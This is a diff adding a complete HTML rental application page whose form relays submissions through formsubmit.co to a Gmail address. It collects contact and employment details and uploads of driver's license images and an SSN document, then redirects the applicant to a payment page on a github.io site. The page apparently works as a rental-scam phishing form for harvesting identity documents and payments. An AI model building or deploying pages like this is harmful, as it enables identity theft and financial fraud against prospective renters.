@@ -1,0 +1,43 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Rental Application Form</title>
+  <meta charset="UTF-8">
+</head>
+<body>
+  <h2>Rental Application</h2>
+  <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
+    <input type="hidden" name="_next" value="https://luxoftorganization.github.io/payment.html">
+
+    <label>Full Name:</label><br>
+    <input type="text" name="full_name" required><br><br>
+
+    <label>Email:</label><br>
+    <input type="email" name="email" required><br><br>
+
+    <label>Phone Number:</label><br>
+    <input type="text" name="phone" required><br><br>
+
+    <label>Current Address:</label><br>
+    <input type="text" name="address" required><br><br>
+
+    <label>Employment Info:</label><br>
+    <textarea name="employment" required></textarea><br><br>
+
+    <label>References:</label><br>
+    <textarea name="references"></textarea><br><br>
+
+    <label>Driver's License (Front):</label><br>
+    <input type="file" name="dl_front" accept="image/*,application/pdf"><br><br>
+
+    <label>Driver's License (Back):</label><br>
+    <input type="file" name="dl_back" accept="image/*,application/pdf"><br><br>
+
+    <label>SSN Document:</label><br>
+    <input type="file" name="ssn_doc" accept="image/*,application/pdf"><br><br>
+
+    <button type="submit">Submit Application</button>
+  </form>
+</body>
+</html>
